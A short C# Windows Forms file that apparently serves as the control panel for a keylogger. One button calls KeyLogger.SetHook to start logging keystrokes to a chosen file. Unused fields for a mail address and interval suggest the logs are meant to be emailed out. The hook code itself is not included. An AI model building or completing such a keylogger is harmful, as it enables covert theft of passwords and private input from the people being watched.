﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace userControlProgram
{
    public partial class Form1 : Form
    {
        private string _logFile, _mailTo;
        private int _mailInterval;
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            KeyLogger.SetHook(_logFile);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            _logFile = openFileDialog1.FileName;
        }
    }
}
